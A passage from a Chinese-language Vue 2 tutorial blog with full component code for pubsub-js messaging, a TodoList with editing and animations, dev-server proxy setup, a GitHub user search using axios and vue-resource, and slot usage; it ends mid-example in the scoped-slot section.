
> 实际上全局事件就是在vm（$bus）上绑定自定义事件
![在这里插入图片描述](https://img-blog.csdnimg.cn/d3fe9903f86c4af58d781d39b8004510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

## 消息订阅与发布(Pubsub)
1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：```pubsub.publish('xxx',数据)```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>

	- School.vue
```html
<template>
	<div class="school">
		<h2>学校名称：{{ name }}</h2>
		<h2>学校地址：{{ address }}</h2>
	</div>
</template>

<script>
import pubsub from "pubsub-js";
export default {
	name: "School",
	data() {
		return {
			name: "尚硅谷",
			address: "北京",
		};
	},
	methods: {
		demo(msgName, data) {
			// console.log("有人发布了hello消息，hello消息的回调执行了", msgName, data);
		},
	},
	mounted() {
		// console.log('School',this)
		/* this.$bus.$on('hello',(data)=>{
				console.log('我是School组件，收到了数据',data)
			}) */
		// msgName为消息名，此处及为“hello”
		this.pubId = pubsub.subscribe("hello", (msgName, data) => {
			// console.log(this)	// 此处的this如果用正常函数为undefined。可用箭头函数解决此问题
			// console.log("有人发布了hello消息，hello消息的回调执行了", msgName, data);
		});

		this.pubId = pubsub.subscribe("hello", this.demo); // 这样写this也没关系
	},
	beforeDestroy() {
		// this.$bus.$off('hello')
		pubsub.unsubscribe(this.pubId);
	},
};
</script>

<style scoped>
.school {
	background-color: skyblue;
	padding: 5px;
}
</style>
```

- Student.vue
```html
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				// this.$bus.$emit('hello',this.name)
				pubsub.publish('hello',666)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```

## 将pubsub运用到TodoList中
- App.vue
```html
<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader @addTodo="addTodo" />
				<MyList :todos="todos" />
				<MyFooter
					:todos="todos"
					@checkAllTodo="checkAllTodo"
					@clearAllTodo="clearAllTodo"
				/>
			</div>
		</div>
	</div>
</template>

<script>
import pubsub from "pubsub-js";
import MyHeader from "./components/MyHeader";
import MyList from "./components/MyList";
import MyFooter from "./components/MyFooter";

export default {
	name: "App",
	components: { MyHeader, MyList, MyFooter },
	data() {
		return {
			//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
			todos: JSON.parse(localStorage.getItem("todos")) || [],
		};
	},
	methods: {
		//添加一个todo
		addTodo(todoObj) {
			this.todos.unshift(todoObj);
		},
		//勾选or取消勾选一个todo
		checkTodo(id) {
			this.todos.forEach((todo) => {
				if (todo.id === id) todo.done = !todo.done;
			});
		},
		//删除一个todo
		// 此处用‘_’占个位
		deleteTodo(_, id) {
			this.todos = this.todos.filter((todo) => todo.id !== id);
		},
		//全选or取消全选
		checkAllTodo(done) {
			this.todos.forEach((todo) => {
				todo.done = done;
			});
		},
		//清除所有已经完成的todo
		clearAllTodo() {
			this.todos = this.todos.filter((todo) => {
				return !todo.done;
			});
		},
	},
	watch: {
		todos: {
			deep: true,
			handler(value) {
				localStorage.setItem("todos", JSON.stringify(value));
			},
		},
	},
	mounted() {
		this.$bus.$on("checkTodo", this.checkTodo);
		this.pubId = pubsub.subscribe("deleteTodo", this.deleteTodo);
	},
	beforeDestroy() {
		this.$bus.$off("checkTodo");
		pubsub.unsubscribe(this.pubId);
	},
};
</script>

<style>
/*base*/
body {
	background: #fff;
}
.btn {
	display: inline-block;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 14px;
	line-height: 20px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
		0 1px 2px rgba(0, 0, 0, 0.05);
	border-radius: 4px;
}
.btn-danger {
	color: #fff;
	background-color: #da4f49;
	border: 1px solid #bd362f;
}
.btn-danger:hover {
	color: #fff;
	background-color: #bd362f;
}
.btn:focus {
	outline: none;
}
.todo-container {
	width: 600px;
	margin: 0 auto;
}
.todo-container .todo-wrap {
	padding: 10px;
	border: 1px solid #ddd;
	border-radius: 5px;
}
</style>

```

- Item.vue
```html
<template>
	<li>
		<label>
			<input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
			<!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props -->
			<!-- <input type="checkbox" v-model="todo.done"/> -->
			<span>{{todo.title}}</span>
		</label>
		<button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
	</li>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'MyItem',
		//声明接收todo
		props:['todo'],
		methods: {
			//勾选or取消勾选
			handleCheck(id){
				//通知App组件将对应的todo对象的done值取反
				// this.checkTodo(id)
				this.$bus.$emit('checkTodo',id)
			},
			//删除
			handleDelete(id){
				if(confirm('确定删除吗？')){
					//通知App组件将对应的todo对象删除
					// this.deleteTodo(id)
					// this.$bus.$emit('deleteTodo',id)
					pubsub.publish('deleteTodo',id)
				}
			}
		},
	}
</script>

<style scoped>
	/*item*/
	li {
		list-style: none;
		height: 36px;
		line-height: 36px;
		padding: 0 5px;
		border-bottom: 1px solid #ddd;
	}

	li label {
		float: left;
		cursor: pointer;
	}

	li label li input {
		vertical-align: middle;
		margin-right: 6px;
		position: relative;
		top: -1px;
	}

	li button {
		float: right;
		display: none;
		margin-top: 3px;
	}

	li:before {
		content: initial;
	}

	li:last-child {
		border-bottom: none;
	}

	li:hover{
		background-color: #ddd;
	}
	
	li:hover button{
		display: block;
	}
</style>
```

## 为TodoList添加修改功能
###  $nextTick方法
1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

###  代码
> 此处个人感觉修改了props中的属性。有些不太妥当

- MyItem.vue
```html
<template>
	<li>
		<label>
			<input
				type="checkbox"
				:checked="todo.done"
				@change="handleCheck(todo.id)"
			/>
			<!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props -->
			<!-- <input type="checkbox" v-model="todo.done"/> -->
			<span v-show="!todo.isEdit">{{ todo.title }}</span>
			<input
				type="text"
				v-show="todo.isEdit"
				:value="todo.title"
				@blur="handleBlur(todo, $event)"
				ref="inputTitle"
			/>
		</label>
		<button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
		<button
			v-show="!todo.isEdit"
			class="btn btn-edit"
			@click="handleEdit(todo)"
		>
			编辑
		</button>
	</li>
</template>

<script>
import pubsub from "pubsub-js";
export default {
	name: "MyItem",
	//声明接收todo
	props: ["todo", "123"],
	methods: {
		//勾选or取消勾选
		handleCheck(id) {
			//通知App组件将对应的todo对象的done值取反
			// this.checkTodo(id)
			this.$bus.$emit("checkTodo", id);
		},
		//删除
		handleDelete(id) {
			if (confirm("确定删除吗？")) {
				//通知App组件将对应的todo对象删除
				// this.deleteTodo(id)
				// this.$bus.$emit('deleteTodo',id)
				pubsub.publish("deleteTodo", id);
			}
		},
		// 编辑
		handleEdit(todo) {
			if (todo.hasOwnProperty("isEdit")) {
				todo.isEdit = true;
			} else {
				console.log("todo身上没有isEdit");
				this.$set(todo, "isEdit", true);
			}
			// vue中是等回调函数全部执行完后再进行模板重新渲染。故以下代码执行时vue还未重新渲染。
			// this.$refs.inputTitle.focus();

			// nextTick的回调会在dom更新完后再执行。也可以用定时器代替
			this.$nextTick(function () {
				this.$refs.inputTitle.focus();
			});

			/* setTimeout(() => {
				this.$refs.inputTitle.focus();
			}); */
		},
		// 失去焦点回调（真正执行修改逻辑）
		handleBlur(todo, e) {
			todo.isEdit = false;
			if (!e.target.value.trim()) return alert("输入不能为空!");
			this.$bus.$emit("updateTodo", todo.id, e.target.value);
		},
	},
};
</script>

<style scoped>
/*item*/
li {
	list-style: none;
	height: 36px;
	line-height: 36px;
	padding: 0 5px;
	border-bottom: 1px solid #ddd;
}

li label {
	float: left;
	cursor: pointer;
}

li label li input {
	vertical-align: middle;
	margin-right: 6px;
	position: relative;
	top: -1px;
}

li button {
	float: right;
	display: none;
	margin-top: 3px;
}

li:before {
	content: initial;
}

li:last-child {
	border-bottom: none;
}

li:hover {
	background-color: #ddd;
}

li:hover button {
	display: block;
}
</style>
```

- App.vue
```html
<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader @addTodo="addTodo" />
				<MyList :todos="todos" />
				<MyFooter
					:todos="todos"
					@checkAllTodo="checkAllTodo"
					@clearAllTodo="clearAllTodo"
				/>
			</div>
		</div>
	</div>
</template>

<script>
import pubsub from "pubsub-js";
import MyHeader from "./components/MyHeader";
import MyList from "./components/MyList";
import MyFooter from "./components/MyFooter";

export default {
	name: "App",
	components: { MyHeader, MyList, MyFooter },
	data() {
		return {
			//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
			todos: JSON.parse(localStorage.getItem("todos")) || [],
		};
	},
	methods: {
		//添加一个todo
		addTodo(todoObj) {
			this.todos.unshift(todoObj);
		},
		//勾选or取消勾选一个todo
		checkTodo(id) {
			this.todos.forEach((todo) => {
				if (todo.id === id) todo.done = !todo.done;
			});
		},
		// 更新一个Todo
		updateTodo(id, title) {
			this.todos.forEach((todo) => {
				if (todo.id === id) todo.title = title;
			});
		},
		//删除一个todo
		// 此处用‘_’占个位
		deleteTodo(_, id) {
			this.todos = this.todos.filter((todo) => todo.id !== id);
		},
		//全选or取消全选
		checkAllTodo(done) {
			this.todos.forEach((todo) => {
				todo.done = done;
			});
		},
		//清除所有已经完成的todo
		clearAllTodo() {
			this.todos = this.todos.filter((todo) => {
				return !todo.done;
			});
		},
	},
	watch: {
		todos: {
			deep: true,
			handler(value) {
				localStorage.setItem("todos", JSON.stringify(value));
			},
		},
	},
	mounted() {
		this.$bus.$on("checkTodo", this.checkTodo);
		this.$bus.$on("updateTodo", this.updateTodo);
		this.pubId = pubsub.subscribe("deleteTodo", this.deleteTodo);
	},
	beforeDestroy() {
		this.$bus.$off("checkTodo");
		this.$bus.$off("updateTodo");
		pubsub.unsubscribe(this.pubId);
	},
};
</script>

<style>
/*base*/
body {
	background: #fff;
}
.btn {
	display: inline-block;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 14px;
	line-height: 20px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
		0 1px 2px rgba(0, 0, 0, 0.05);
	border-radius: 4px;
}
.btn-danger {
	color: #fff;
	background-color: #da4f49;
	border: 1px solid #bd362f;
}
.btn-danger:hover {
	color: #fff;
	background-color: #bd362f;
}
.btn-edit {
	color: #fff;
	background-color: skyblue;
	border: 1px solid rgb(67, 183, 230);
}
.btn-edit:hover {
	color: #fff;
	background-color: skyblue;
}
.btn:focus {
	outline: none;
}
.todo-container {
	width: 600px;
	margin: 0 auto;
}
.todo-container .todo-wrap {
	padding: 10px;
	border: 1px solid #ddd;
	border-radius: 5px;
}
</style>

```

## Vue动画
1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：![在这里插入图片描述](https://img-blog.csdnimg.cn/adc56589d7f94c8c9fdc440f09d7dc21.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)


3. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。
### 动画效果
```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<!-- transition最终没有被显示在html结构中 -->
		<transition name="hello" appear>
			<!-- vue保证如果你将标签添加到transition中，则transition内的元素出现或消失时，会执行你提前写好的动画 -->
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
	</div>
</template>

<script>
export default {
	name: "Test",
	data() {
		return {
			isShow: true,
		};
	},
};
</script>

<style scoped>
h1 {
	background-color: orange;
}

/* .v-enter-active {
	animation: atguigu 1s;
} */

/* transition没有name属性的话，类名为v-,否则为name- */
.hello-enter-active {
	animation: atguigu 1s;
}

.hello-leave-active {
	animation: atguigu 1s reverse;
}

@keyframes atguigu {
	from {
		transform: translateX(-100%);
	}
	to {
		transform: translateX(0px);
	}
}
</style>
```

### 过渡效果
```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<!-- transition最终没有被显示在html结构中 -->
		<transition name="hello" appear>
			<!-- vue保证如果你将标签添加到transition中，则transition内的元素出现或消失时，会执行你提前写好的动画 -->
			<h1 v-show="isShow">你好啊！</h1>
		</transition>
	</div>
</template>

<script>
export default {
	name: "Test",
	data() {
		return {
			isShow: true,
		};
	},
};
</script>

<style scoped>
h1 {
	background-color: orange;
	/* transition: 0.5s linear; */
}
/* 进入的起点  离开的终点 */
.hello-enter,
.hello-leave-to {
	transform: translateX(-100%);
}
.hello-enter-active,
.hello-leave-active {
	transition: 0.5s linear;
}
/* 进入的终点 离开的起点*/
.hello-enter-to,
.hello-leave {
	transform: translateX(0);
}
</style>
```

### 多个元素过渡
```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<!-- transition最终没有被显示在html结构中 -->
		<transition-group name="hello" appear>
			<!-- vue保证如果你将标签添加到transition中，则transition内的元素出现或消失时，会执行你提前写好的动画 -->
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">xxc！</h1>
		</transition-group>
	</div>
</template>

<script>
export default {
	name: "Test",
	data() {
		return {
			isShow: true,
		};
	},
};
</script>

<style scoped>
h1 {
	background-color: orange;
	/* transition: 0.5s linear; */
}
/* 进入的起点  离开的终点 */
.hello-enter,
.hello-leave-to {
	transform: translateX(-100%);
}
.hello-enter-active,
.hello-leave-active {
	transition: 0.5s linear;
}
/* 进入的终点 离开的起点*/
.hello-enter-to,
.hello-leave {
	transform: translateX(0);
}
</style>
```

### 集成第三方动画
[Animate.css官网](https://animate.style/)
```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<!-- transition最终没有被显示在html结构中 -->
		<transition-group
			appear
			name="animate__animated animate__bounce"
			enter-active-class="animate__swing"
			leave-active-class="animate__wobble"
		>
			<!-- vue保证如果你将标签添加到transition中，则transition内的元素出现或消失时，会执行你提前写好的动画 -->
			<h1 key="1" v-show="isShow">你好啊！</h1>
		</transition-group>
	</div>
</template>

<script>
import "animate.css";
export default {
	name: "Test",
	data() {
		return {
			isShow: true,
		};
	},
};
</script>

<style scoped>
h1 {
	background-color: orange;
	/* transition: 0.5s linear; */
}
</style>
```

### TodoList中添加动画
```html
<template>
	<ul class="todo-main">
		<transition-group name="todo" appear>
			<MyItem v-for="todoObj in todos" :key="todoObj.id" :todo="todoObj" />
		</transition-group>
	</ul>
</template>

<script>
import MyItem from "./MyItem";

export default {
	name: "MyList",
	components: { MyItem },
	//声明接收App传递过来的数据
	props: ["todos"],
};
</script>

<style scoped>
/*main*/
.todo-main {
	margin-left: 0px;
	border: 1px solid #ddd;
	border-radius: 2px;
	padding: 0px;
}

.todo-empty {
	height: 40px;
	line-height: 40px;
	border: 1px solid #ddd;
	border-radius: 2px;
	padding-left: 5px;
	margin-top: 10px;
}

.todo-enter-active {
	animation: atguigu 0.5s;
}

.todo-leave-active {
	animation: atguigu 0.5s reverse;
}

@keyframes atguigu {
	from {
		transform: translateX(-100%);
	}
	to {
		transform: translateX(0px);
	}
}
</style>
```

## 配置代理
### 方法一（配置一个代理）

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）


- App.vue
```html
<template>
	<div>
		<button @click="getStudents">获取学生信息</button>
	</div>
</template>

<script>
import axios from "axios";
export default {
	name: "App",
	methods: {
		getStudents() {
			// 此处找代理服务器要数据，而代理服务器的协议地址与脚手架服务器一样
			axios.get("http://localhost:8080/students").then(
				(response) => {
					console.log("请求成功了", response.data);
				},
				(error) => {
					console.log("请求失败了", error.message);
				}
			);
		},
	},
};
</script>

```

- vue.config.js
```js
module.exports = {
    pages: {
        index: {
            // 入口
            entry: 'src/main.js'
        }
    },
    lintOnSave: false, // 关闭语法检查
    // 开启代理服务器
    devServer: {
        // 此种配置代理的方法只能配置一个代理，而且只能等到本地public文件夹中没有相应的文件才能发送请求成功
        proxy: 'http://localhost:5000'
    }
}
```
### 方法二（配置多个代理）

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。


- vue.config.js
```js
module.exports = {
    pages: {
        index: {
            // 入口
            entry: 'src/main.js'
        }
    },
    lintOnSave: false, // 关闭语法检查
    // 开启代理服务器（方式一）
    /* devServer: {
        // 此种配置代理的方法只能配置一个代理，而且只能等到本地public文件夹中没有相应的文件才能发送请求成功
        proxy: 'http://localhost:5000'
    } */
    // 开启代理服务器（方式二）
    devServer: {
        proxy: {
            '/atguigu': {
                target: 'http://localhost:5000',
                pathRewrite: { '^/atguigu': '' },
                // ws: true, //用于支持websocket
                // changeOrigin: true //用于控制请求头中的host值(如果是true，会说谎，服务器会得到的代理服务器端口与服务器一样。否则服务器得到的代理服务器端口与脚手架端口一样)，此处不写都默认为true
            },
            '/demo': {
                target: 'http://localhost:5001',
                pathRewrite: { '^/demo': '' },
                // ws: true, //用于支持websocket
                // changeOrigin: true //用于控制请求头中的host值
            }
        }
    }
}
```

- App.vue
```html
<template>
	<div>
		<button @click="getStudents">获取学生信息</button>
		<button @click="getCars">获取汽车信息</button>
	</div>
</template>

<script>
import axios from "axios";
export default {
	name: "App",
	methods: {
		getStudents() {
			// 此处找代理服务器要数据，而代理服务器的协议地址与脚手架服务器一样
			axios.get("http://localhost:8080/atguigu/students").then(
				(response) => {
					console.log("请求成功了", response.data);
				},
				(error) => {
					console.log("请求失败了", error.message);
				}
			);
		},
		getCars() {
			axios.get("http://localhost:8080/demo/cars").then(
				(response) => {
					console.log("请求成功了", response.data);
				},
				(error) => {
					console.log("请求失败了", error.message);
				}
			);
		},
	},
};
</script>

```

## github案例
### bootstrap.css静态文件导入
#### 方式一：将文件存到assets文件夹中，在App.vue中通过import进行引入
![在这里插入图片描述](https://img-blog.csdnimg.cn/17091ba93e8e47a29748db44b233d371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
> 产生的问题：由于bootstrap.css内部使用了本项目中未使用的字体文件，我们未引入。此时使用import方式引入会报错。故此方式不适用。

#### 方式二：在index.html中引入
![在这里插入图片描述](https://img-blog.csdnimg.cn/370a7782db394cfaa8e6561073b5c38a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
### 代码
- main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el: '#app',
	render: h => h(App),
	beforeCreate() {
		Vue.prototype.$bus = this
	},
})
```

- App.vue
```html
<template>
	<div class="container">
		<Search />
		<List />
	</div>
</template>

<script>
import Search from "./components/Search.vue";
import List from "./components/List.vue";
export default {
	name: "App",
	components: { Search, List },
};
</script>

```
- Search.vue
```html
<template>
	<section class="jumbotron">
		<h3 class="jumbotron-heading">Search Github Users</h3>
		<div>
			<input
				type="text"
				placeholder="enter the name you search"
				v-model="keyWord"
			/>&nbsp;
			<button @click="searchUsers">Search</button>
		</div>
	</section>
</template>

<script>
import axios from "axios";
export default {
	name: "Search",
	data() {
		return {
			keyWord: "",
		};
	},
	methods: {
		searchUsers() {
			// 请求前更新List的数据
			this.$bus.$emit("updateListData", {
				isFirst: false,
				isLoading: true,
				errMsg: "",
				users: [],
			});

			axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
				// 请求成功后更新List的数据
				(response) => {
					console.log("请求成功了");
					this.$bus.$emit("updateListData", {
						isLoading: false,
						errMsg: "",
						users: response.data.items,
					});
				},
				// 请求失败后更新List的数据
				(error) => {
					console.log("请求失败了", {
						isLoading: false,
						errMsg: error,
						users: [],
					});
				}
			);
		},
	},
};
</script>

<style>
</style>
```
- List.vue
```html
<template>
	<div class="row">
		<!-- 展示用户列表 -->
		<div
			v-show="info.users.length"
			class="card"
			v-for="user in info.users"
			:key="user.login"
		>
			<a :href="user.html_url" target="_blank">
				<img :src="user.avatar_url" style="width: 100px" />
			</a>
			<p class="card-text">{{ user.login }}</p>
		</div>

		<!-- 展示欢迎词 -->
		<h1 v-show="info.isFirst">欢迎使用</h1>
		<!-- 展示加载中 -->
		<h1 v-show="info.isLoading">加载中...</h1>
		<!-- 展示错误信息 -->
		<h1 v-show="info.errMsg">{{ info.errMsg }}</h1>
	</div>
</template>

<script>
export default {
	name: "List",
	data() {
		return {
			info: {
				isFirst: true,
				isLoading: false,
				errMsg: "",
				users: [],
			},
		};
	},
	mounted() {
		this.$bus.$on("updateListData", (dataObj) => {
			// console.log("我是List组件，收到数据:", users);
			this.info = { ...this.info, ...dataObj }; // 使得isFirst不至于丢失
		});
	},
};
</script>

<style scoped>
.album {
	min-height: 50rem; /* Can be removed; just added for demo purposes */
	padding-top: 3rem;
	padding-bottom: 3rem;
	background-color: #f7f7f7;
}

.card {
	float: left;
	width: 33.333%;
	padding: 0.75rem;
	margin-bottom: 2rem;
	border: 1px solid #efefef;
	text-align: center;
}

.card > img {
	margin-bottom: 0.75rem;
	border-radius: 100px;
}

.card-text {
	font-size: 85%;
}
</style>
```

### 使用vue-resource发送网络请求
> 安装命令：npm i vue-resource
- main.js
```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import vueResource from 'vue-resource'
//关闭Vue的生产提示
Vue.config.productionTip = false

// 使用插件
Vue.use(vueResource)	// 此插件在所有组件上添加了$http属性

//创建vm
new Vue({
	el: '#app',
	render: h => h(App),
	beforeCreate() {
		Vue.prototype.$bus = this
	},

})
```

- Search.vue
```html
<template>
	<section class="jumbotron">
		<h3 class="jumbotron-heading">Search Github Users</h3>
		<div>
			<input
				type="text"
				placeholder="enter the name you search"
				v-model="keyWord"
			/>&nbsp;
			<button @click="searchUsers">Search</button>
		</div>
	</section>
</template>

<script>
import axios from "axios";
export default {
	name: "Search",
	data() {
		return {
			keyWord: "",
		};
	},
	methods: {
		searchUsers() {
			console.log(this);
			// 请求前更新List的数据
			this.$bus.$emit("updateListData", {
				isFirst: false,
				isLoading: true,
				errMsg: "",
				users: [],
			});

			this.$http
				.get(`https://api.github.com/search/users?q=${this.keyWord}`)
				.then(
					// 请求成功后更新List的数据
					(response) => {
						console.log("请求成功了");
						this.$bus.$emit("updateListData", {
							isLoading: false,
							errMsg: "",
							users: response.data.items,
						});
					},
					// 请求失败后更新List的数据
					(error) => {
						console.log("请求失败了", {
							isLoading: false,
							errMsg: error,
							users: [],
						});
					}
				);
		},
	},
};
</script>

<style>
</style>
```

## 插槽
###  默认插槽
- App.vue
```html
<template>
	<div class="container">
		<Category title="美食" :listData="foods">
			<img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="" />
		</Category>
		<Category title="游戏" :listData="games">
			<ul>
				<li v-for="(g, index) in games" :key="index">{{ g }}</li>
			</ul>
		</Category>
		<Category title="电影" :listData="films">
			<video
				controls
				src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"
			></video>
		</Category>
	</div>
</template>

<script>
import Category from "../../src/components/Category.vue";
export default {
	name: "App",
	components: { Category },
	data() {
		return {
			foods: ["火锅", "烧烤", "小龙虾", "牛排"],
			games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
			films: ["《教父》", "《拆弹专家》", "《你好，李焕英》", "《尚硅谷》"],
		};
	},
};
</script>

<style scoped>
.container {
	display: flex;
	justify-content: space-around;
}
img {
	width: 100%;
}
video {
	width: 100%;
}
</style>

```

- Category.vue
```html
<template>
	<div class="category">
		<h3>{{ title }}分类</h3>
		<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
		<slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
	</div>
</template>

<script>
export default {
	name: "Category",
	props: ["title"],
};
</script>

<style scoped>
.category {
	background-color: skyblue;
	width: 200px;
	height: 300px;
}
h3 {
	text-align: center;
	background-color: orange;
}
</style>
```
> 注意：此处img和video标签都是在App组件中解析后再传给Category组件的。所以它们的样式既可以在App中写，也可以在Category中写。

### 具名插槽
- App.vue
```html
<template>
	<div class="container">
		<Category title="美食" :listData="foods">
			<!-- 通过slot属性与slot插槽的name一一对应，来进行插入 -->
			<img
				slot="center"
				src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg"
				alt=""
			/>
			<a slot="footer" href="javascript:;">更多美食</a>
		</Category>
		<Category title="游戏" :listData="games">
			<ul slot="center">
				<li v-for="(g, index) in games" :key="index">{{ g }}</li>
			</ul>
			<!-- slot同名时，会往插槽追加内容 -->
			<!-- <div class="foot">
				<a slot="footer" href="">单击游戏</a>
				<a slot="footer" href="">网络游戏</a>
			</div> -->
			<div class="foot" slot="footer">
				<a href="">单击游戏</a>
				<a href="">网络游戏</a>
			</div>
		</Category>
		<Category title="电影" :listData="films">
			<video
				slot="center"
				controls
				src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"
			></video>
			<!-- <template slot="footer">
				<div class="foot">
					<a href="">经典</a>
					<a href="">热门</a>
					<a href="">推荐</a>
				</div>
				<h4>欢迎前来观影</h4>
			</template> -->

			<!-- 当用template标签时，还可以用以下写法。注意：只有template可以用 -->
			<template v-slot:footer>
				<div class="foot">
					<a href="">经典</a>
					<a href="">热门</a>
					<a href="">推荐</a>
				</div>
				<h4>欢迎前来观影</h4>
			</template>
		</Category>
	</div>
</template>

<script>
import Category from "./components/Category.vue";
export default {
	name: "App",
	components: { Category },
	data() {
		return {
			foods: ["火锅", "烧烤", "小龙虾", "牛排"],
			games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
			films: ["《教父》", "《拆弹专家》", "《你好，李焕英》", "《尚硅谷》"],
		};
	},
};
</script>

<style scoped>
.container,
.foot {
	display: flex;
	justify-content: space-around;
}
img {
	width: 100%;
}
video {
	width: 100%;
}
h4 {
	text-align: center;
}
</style>
```

- Category.vue
```html
<template>
	<div class="category">
		<h3>{{ title }}分类</h3>
		<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
		<slot name="center"
			>我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot
		>
		<slot name="footer"
			>我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot
		>
	</div>
</template>

<script>
export default {
	name: "Category",
	props: ["title"],
};
</script>

<style scoped>
.category {
	background-color: skyblue;
	width: 200px;
	height: 300px;
}
h3 {
	text-align: center;
	background-color: orange;
}
</style>
```

###  作用域插槽
- App.vue
```html
<template>
	<div class="container">
		<!-- 作用域插槽：数据在定义插槽的组件中，并使得根据插槽生成的结构由使用者来决定 -->
		<Category title="游戏">
			<!-- 此处的template和scope都是必须的，而atguigu是一个对象，对象里有<slot>中传来的数据 -->
			<template scope="atguigu">
				<ul>
					<li v-for="(g, index) in atguigu.games" :key="index">{{ g }}</li>
				</ul>
			</template>
		</Category>

		<Category title="游戏">
			<template scope="{games}">
				<ol>
